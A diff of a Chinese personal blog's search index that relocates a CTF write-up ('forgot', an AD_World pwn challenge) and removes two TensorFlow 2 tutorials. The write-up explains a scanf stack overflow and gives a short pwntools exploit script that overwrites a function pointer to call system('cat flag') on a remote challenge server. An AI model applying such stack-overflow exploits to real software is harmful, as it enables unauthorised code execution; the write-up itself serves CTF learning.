@@ -63,44 +63,6 @@
       </tags>
   </entry>
   <entry>
-    <title>forgot</title>
-    <url>/xiaohong404.github.io/2020/10/27/AD_World/forgot/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/6.png" class></strong></p>
-<h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/1.png" class></strong></p>
-<h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/2.png" class></strong></p>
-<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
-<h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/3.png" class></strong></p>
-<p>找到其调用函数的位置</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/4.png" class></strong></p>
-<p>查看sub_80486CC函数所在地址（这里函数名称就对应其地址）</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/5.png" class></strong></p>
-<p>其函数所在地址0x080486CC，注意这里调用system函数需要传递<strong>cat flag</strong>参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。</p>
-<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/7.png" class></strong></p>
-<p>v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/8.png" class></strong></p>
-<p>即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/9.png" class></strong></p>
-<p>查看其ASCII码对应的字符为：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/10.png" class></strong></p>
-<p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/11.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>AD_World</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>Stack</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C语言实现Linux-touch命令</title>
     <url>/xiaohong404.github.io/2020/10/25/C/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0Linux-touch%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/25/C/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0Linux-touch%E5%91%BD%E4%BB%A4/0.png" class></strong></p>
@@ -384,273 +346,41 @@
       </tags>
   </entry>
   <entry>
-    <title>TensorFlow2基础概念语法</title>
-    <url>/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/0.png" class></strong></p>
+    <title>forgot</title>
+    <url>/xiaohong404.github.io/2020/10/27/AD_World/forgot/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/0.png" class></strong></p>
  <a id="more"></a>
 
-<h2 id="张量"><a href="#张量" class="headerlink" title="张量"></a>张量</h2><p>数学或物理上关于张量的两种定义方法（抽象）：</p>
-<ul>
-<li>通常定义张量的物理学或传统数学方法，是把张量看成一个多维数组，当变换坐标或变换基底时，其分量会按照一定规则进行变换，这些规则有两种：即协变或逆变转换。</li>
-<li>通常现代数学中的方法，是把张量定义成某个矢量空间或其对偶空间上的多重线性映射，这矢量空间在需要引入基底之前不固定任何坐标系统。例如协变矢量，可以描述为 1-形式，或者作为逆变矢量的对偶空间的元素。</li>
-</ul>
-<p>通俗来讲，一阶张量为向量，二阶张量为矩阵。当然，零阶张量也就是标量，而更重要的是 𝑁 阶张量，也就是 𝑁 维数组。</p>
-<table>
-<thead>
-<tr>
-<th align="center">阶</th>
-<th align="center">数学实例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">0</td>
-<td align="center">标量（只有大小）</td>
-</tr>
-<tr>
-<td align="center">1</td>
-<td align="center">矢量（大小和方向）</td>
-</tr>
-<tr>
-<td align="center">2</td>
-<td align="center">矩阵（数据表）</td>
-</tr>
-<tr>
-<td align="center">3</td>
-<td align="center">3 阶张量（数据立体）</td>
-</tr>
-<tr>
-<td align="center">N</td>
-<td align="center">N 阶张量（自行想象）</td>
-</tr>
-</tbody></table>
-<p><strong><img src="/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/1.png" class></strong></p>
-<p>大多数深度学习框架都会使用张量的概念，这样做的好处是统一对数据的定义。NumPy 中，数据都使用 Ndarray 多维数组进行定义，TensorFlow 中，数据都会用张量进行表述。</p>
-<p>下面就来学习 TensorFlow 中对张量的定义。在 TensorFlow 中，每一个 Tensor 都具备两个基础属性：<strong>数据类型（默认：float32）和形状</strong>。</p>
-<p>其中，数据类型大致如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th align="center">Tensor 类型</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><code>tf.float32</code></td>
-<td align="center">32 位浮点数</td>
-</tr>
-<tr>
-<td align="center"><code>tf.float64</code></td>
-<td align="center">64 位浮点数</td>
-</tr>
-<tr>
-<td align="center"><code>tf.int64</code></td>
-<td align="center">64 位有符号整型</td>
-</tr>
-<tr>
-<td align="center"><code>tf.int32</code></td>
-<td align="center">32 位有符号整型</td>
-</tr>
-<tr>
-<td align="center"><code>tf.int16</code></td>
-<td align="center">16 位有符号整型</td>
-</tr>
-<tr>
-<td align="center"><code>tf.int8</code></td>
-<td align="center">8 位有符号整型</td>
-</tr>
-<tr>
-<td align="center"><code>tf.uint8</code></td>
-<td align="center">8 位无符号整型</td>
-</tr>
-<tr>
-<td align="center"><code>tf.string</code></td>
-<td align="center">可变长度的字节数组</td>
-</tr>
-<tr>
-<td align="center"><code>tf.bool</code></td>
-<td align="center">布尔型</td>
-</tr>
-<tr>
-<td align="center"><code>tf.complex64</code></td>
-<td align="center">实数和虚数</td>
-</tr>
-</tbody></table>
-<p>另外，TensorFlow 通过三种符号约定来描述张量维度：<strong>阶，形状和维数</strong>。三者之间的关系如下：</p>
-<table>
-<thead>
-<tr>
-<th align="center">形状</th>
-<th align="center">阶</th>
-<th align="center">维数</th>
-<th align="center">示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">[]</td>
-<td align="center">0</td>
-<td align="center">0-D</td>
-<td align="center">0 维张量，标量。</td>
-</tr>
-<tr>
-<td align="center">[D0]</td>
-<td align="center">1</td>
-<td align="center">1-D</td>
-<td align="center">形状为 [5] 的 1 维张量。</td>
-</tr>
-<tr>
-<td align="center">[D0, D1]</td>
-<td align="center">2</td>
-<td align="center">2-D</td>
-<td align="center">形状为 [3, 4] 的 2 维张量。</td>
-</tr>
-<tr>
-<td align="center">[D0, D1, D2]</td>
-<td align="center">3</td>
-<td align="center">3-D</td>
-<td align="center">形状为 [1, 4, 3] 的 3 维张量。</td>
-</tr>
-<tr>
-<td align="center">[D0, D1, … Dn-1]</td>
-<td align="center">n</td>
-<td align="center">n-D</td>
-<td align="center">形状为 [D0, D1, … Dn-1] 的张量。</td>
-</tr>
-</tbody></table>
-<p>值得注意的是，上表中的示例都是形容张量的形状。例如 <code>[3, 4]</code> 指的张量的形状为 <code>[3, 4]</code>，而不是张量 <code>[3, 4]</code>。</p>
-<p> 根据不同的用途，TensorFlow 中主要有 2 种张量类型，分别是：</p>
-<ul>
-<li><p><code>tf.Variable</code> ：变量 Tensor，需要指定初始值，常用于定义可变参数，例如神经网络的权重。</p>
-</li>
-<li><p><code>tf.constant</code> ：常量 Tensor，需要指定初始值，定义不变化的张量。</p>
-</li>
-</ul>
-<p>我们可以通过传入列表或 NumPy 数组来新建变量和常量类型的张量：</p>
-<p>查看tensorflow版本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.__version__</span><br><span class="line"></span><br><span class="line">Out:  <span class="string">&#x27;2.1.0&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/6.png" class></strong></p>
+<h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/1.png" class></strong></p>
+<h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/2.png" class></strong></p>
+<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
+<h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/3.png" class></strong></p>
+<p>找到其调用函数的位置</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/4.png" class></strong></p>
+<p>查看sub_80486CC函数所在地址（这里函数名称就对应其地址）</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/5.png" class></strong></p>
+<p>其函数所在地址0x080486CC，注意这里调用system函数需要传递<strong>cat flag</strong>参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。</p>
+<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/7.png" class></strong></p>
+<p>v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/8.png" class></strong></p>
+<p>即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/9.png" class></strong></p>
+<p>查看其ASCII码对应的字符为：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/10.png" class></strong></p>
+<p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>  输入形状为 (2, 2) 的二维变量</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v = tf.Variable([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])  <span class="comment"># 形状为 (2, 2) 的二维变量</span></span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Variable <span class="string">&#x27;Variable:0&#x27;</span> shape=(<span class="number">2</span>, <span class="number">2</span>) dtype=int32, numpy=</span><br><span class="line">		array([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">      		   [<span class="number">3</span>, <span class="number">4</span>]], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>  输入形状为 (2, 2) 的二维常量</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = tf.constant([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])  <span class="comment"># 形状为 (2, 2) 的二维常量</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">2</span>), dtype=int32, numpy=</span><br><span class="line">    	 array([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">         	    [<span class="number">3</span>, <span class="number">4</span>]], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>输出包含了张量的 3 部分属性，分别是形状 <code>shape</code>，数据类型 <code>dtype</code>，以及对应的 NumPy 数组。</p>
-<p>还可以直接通过 <code>.numpy()</code> 输出张量的 NumPy 数组：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.numpy()</span><br><span class="line"></span><br><span class="line">Out:  array([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">             [<span class="number">3</span>, <span class="number">4</span>]], dtype=int32)</span><br></pre></td></tr></table></figure>
-
-<p>下面列举几个经常会用到的新建特殊常量张量的方法：</p>
-<ul>
-<li><code>tf.zeros</code>：新建指定形状且全为 0 的常量 Tensor</li>
-<li><code>tf.zeros_like</code>：参考某种形状，新建全为 0 的常量 Tensor</li>
-<li><code>tf.ones</code>：新建指定形状且全为 1 的常量 Tensor</li>
-<li><code>tf.ones_like</code>：参考某种形状，新建全为 1 的常量 Tensor</li>
-<li><code>tf.fill</code>：新建一个指定形状且全为某个标量值的常量 Tensor</li>
-</ul>
-<p>3x3 全为 0 的常量 Tensor</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = tf.zeros([<span class="number">3</span>, <span class="number">3</span>])  <span class="comment"># 3x3 全为 0 的常量 Tensor</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">3</span>, <span class="number">3</span>), dtype=float32, numpy=</span><br><span class="line">        array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>与 c 形状一致全为 1 的常量 Tensor</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.ones_like(c)  <span class="comment"># 与 c 形状一致全为 1 的常量 Tensor</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">3</span>, <span class="number">3</span>), dtype=float32, numpy=</span><br><span class="line">        array([[<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">               [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">               [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2x3 全为 6 的常量 Tensor</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.fill([<span class="number">2</span>, <span class="number">3</span>], <span class="number">6</span>)  <span class="comment"># 2x3 全为 6 的常量 Tensor</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">3</span>), dtype=int32, numpy=</span><br><span class="line">        array([[<span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>],</span><br><span class="line">               [<span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>]], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>除此之外，还可以创建一些序列:</p>
-<ul>
-<li><code>tf.linspace</code>：创建一个等间隔序列。</li>
-<li><code>tf.range</code>：创建一个数字序列。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.linspace(<span class="number">1.0</span>, <span class="number">10.0</span>, <span class="number">5</span>, name=<span class="string">&quot;linspace&quot;</span>)</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">5</span>,), dtype=float32, numpy=array([ <span class="number">1.</span>  ,  <span class="number">3.25</span>,  <span class="number">5.5</span> ,  <span class="number">7.75</span>, <span class="number">10.</span>  ],     dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.range(start=<span class="number">1</span>, limit=<span class="number">10</span>, delta=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">5</span>,), dtype=int32, numpy=array([<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>], dtype=int32)&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Eager-Execution"><a href="#Eager-Execution" class="headerlink" title="Eager Execution"></a>Eager Execution</h2><p>TensorFlow 2 带来的最大改变之一是将 1.x 的 Graph Execution（图与会话机制）更改为 Eager Execution（动态图机制）。在 1.x 版本中，低级别 TensorFlow API 首先需要定义数据流图，然后再创建 TensorFlow 会话，这一点在 2.0 中被完全舍弃。TensorFlow 2 中的 Eager Execution 是一种命令式编程环境，可立即评估操作，无需构建图。</p>
-<p>所以说，TensorFlow 的张量运算过程可以像 NumPy 一样直观且自然了。接下来，我们以最简单的加法运算为例：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c + c  <span class="comment"># 加法计算</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">3</span>, <span class="number">3</span>), dtype=float32, numpy=</span><br><span class="line">        array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">               [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 1.x 版本的 TensorFlow，一个加法运算过程十分复杂。我们需要初始化全局变量 → 建立会话 → 执行计算，最终才能打印出张量的运算结果。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_op = tf.global_variables_initializer()  <span class="comment"># 初始化全局变量</span></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:  <span class="comment"># 启动会话</span></span><br><span class="line">    sess.run(init_op)</span><br><span class="line">    print(sess.run(c + c))  <span class="comment"># 执行计算</span></span><br></pre></td></tr></table></figure>
-
-<p>Eager Execution 带来的好处显而易见，其进一步降低了 TensorFlow 的入门门槛。之前的 Graph Execution 模式，实际上让很多人在入门时都很郁闷，因为完全不符合正常思维习惯。</p>
-<p>TensorFlow 中提供的数学计算，包括线性代数计算方面的方法也是应有尽有，十分丰富。下面，我们再列举几个示例:</p>
-<p>矩阵乘法：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = tf.constant([<span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>, <span class="number">4.</span>, <span class="number">5.</span>, <span class="number">6.</span>], shape=[<span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">b = tf.constant([<span class="number">7.</span>, <span class="number">8.</span>, <span class="number">9.</span>, <span class="number">10.</span>, <span class="number">11.</span>, <span class="number">12.</span>], shape=[<span class="number">3</span>, <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">c = tf.linalg.matmul(a, b)  <span class="comment"># 矩阵乘法</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">2</span>), dtype=float32, numpy=</span><br><span class="line">        array([[ <span class="number">58.</span>,  <span class="number">64.</span>],</span><br><span class="line">               [<span class="number">139.</span>, <span class="number">154.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>转置矩阵：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.linalg.matrix_transpose(c)  <span class="comment"># 转置矩阵</span></span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">2</span>, <span class="number">2</span>), dtype=float32, numpy=</span><br><span class="line">        array([[ <span class="number">58.</span>, <span class="number">139.</span>],</span><br><span class="line">               [ <span class="number">64.</span>, <span class="number">154.</span>]], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>可以把 TensorFlow 理解成为 TensorFlow 式的 NumPy + 为搭建神经网络而生的 API</code></p>
-<h2 id="自动微分"><a href="#自动微分" class="headerlink" title="自动微分"></a>自动微分</h2><p>在数学中，微分是对函数的局部变化率的一种线性描述。虽然微分和导数是两个不同的概念。但是，对一元函数来说，可微与可导是完全等价的。如果熟悉神经网络的搭建过程，应该明白梯度的重要性。而对于复杂函数的微分过程是极其麻烦的，为了提高应用效率，大部分深度学习框架都有自动微分机制。</p>
-<p>TensorFlow 中，可以使用 <code>tf.GradientTape</code> 跟踪全部运算过程，以便在必要的时候计算梯度。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">w = tf.Variable([<span class="number">1.0</span>])  <span class="comment"># 新建张量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">    loss = w * w</span><br><span class="line"></span><br><span class="line">grad = tape.gradient(loss, w)  <span class="comment"># 计算梯度</span></span><br><span class="line">grad</span><br><span class="line"></span><br><span class="line">Out:  &lt;tf.Tensor: shape=(<span class="number">1</span>,), dtype=float32, numpy=array([<span class="number">2.</span>], dtype=float32)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上面演示了一个自动微分过程，它的数学求导过程如下：</p>
-<p>$$ loss = w^2 \rightarrow \frac {\partial loss}{\partial w} = 2w $$</p>
-<p>所以，当 w 等于 1 时，计算结果为 2。</p>
-<p><code>tf.GradientTape</code> 会像磁带一样记录下计算图中的梯度信息，然后使用 <code>.gradient</code> 即可回溯计算出任意梯度，这对于使用 TensorFlow 低阶 API 构建神经网络时更新参数非常重要。</p>
-<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><p>上面已经学习了 TensorFlow 核心知识，接下来将对 TensorFlow API 中的常用模块进行简单的功能介绍。对于框架的使用，实际上就是灵活运用各种封装好的类和函数。由于 TensorFlow API 数量太多，迭代太快，所以要养成随时 <a href="https://www.tensorflow.org/versions/r2.0/api_docs/python/tf"> <em>查阅官方文档</em></a> 的习惯。</p>
-<ul>
-<li><code>tf.</code>：包含了张量定义，变换等常用函数和类。</li>
-<li><code>tf.data</code>：输入数据处理模块，提供了像 <code>tf.data.Dataset</code> 等类用于封装输入数据，指定批量大小等。</li>
-<li><code>tf.image</code>：图像处理模块，提供了像图像裁剪，变换，编码，解码等类。</li>
-<li><code>tf.keras</code>：原 Keras 框架高阶 API。包含原 <code>tf.layers</code> 中高阶神经网络层。</li>
-<li><code>tf.linalg</code>：线性代数模块，提供了大量线性代数计算方法和类。</li>
-<li><code>tf.losses</code>：损失函数模块，用于方便神经网络定义损失函数。</li>
-<li><code>tf.math</code>：数学计算模块，提供了大量数学计算函数。</li>
-<li><code>tf.saved_model</code>：模型保存模块，可用于模型的保存和恢复。</li>
-<li><code>tf.train</code>：提供用于训练的组件，例如优化器，学习率衰减策略等。</li>
-<li><code>tf.nn</code>：提供用于构建神经网络的底层函数，以帮助实现深度神经网络各类功能层。</li>
-<li><code>tf.estimator</code>：高阶 API，提供了预创建的 Estimator 或自定义组件。</li>
-</ul>
-<p>在构建深度神经网络时，TensorFlow 可以说提供了你一切想要的组件，从不同形状的张量、激活函数、神经网络层，到优化器、数据集等，一应俱全。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/11.png" class></strong></p>
 ]]></content>
       <categories>
-        <category>Machine Learning</category>
-        <category>TensorFlow</category>
+        <category>PWN</category>
+        <category>AD_World</category>
       </categories>
       <tags>
-        <tag>TensorFlow2.0</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>导数计算和自动微分实现</title>
-    <url>/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/0.png" class></strong></p>
- <a id="more"></a>
-
-<h2 id="导数计算"><a href="#导数计算" class="headerlink" title="导数计算"></a>导数计算</h2><p>Sigmoid 函数是机器学习中会经常看到的一个函数，它是逻辑回归的基础也可以充当神经网络的激活函数。Sigmoid 函数如下所示：</p>
-<p>$<br>\mathit{sigmoid}(x) = \frac{1}{1+e^{-x}}<br>$</p>
-<p>下面使用Tensorflow实现sigmoid函数：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.__version__</span><br><span class="line"></span><br><span class="line">Out:  <span class="string">&#x27;2.1.0&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">x</span>):</span></span><br><span class="line">    s = <span class="number">1</span> / (<span class="number">1</span> + tf.math.exp(-x))</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
-
-<p>接下来，使用 TensorFlow 2 提供的方法初始化一组 [−10,10] 之间等间隔的 100 个值，并作为 Sigmoid 函数的输入。最终，使用 Matplotlib 绘制出 Sigmoid 函数的曲线。同样，使用 TensorFlow 2 提供的相关方法。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line">x = tf.linspace(<span class="number">-10.0</span>, <span class="number">10.0</span>, <span class="number">100</span>)</span><br><span class="line">plt.plot(x, sigmoid(x))</span><br></pre></td></tr></table></figure>
-
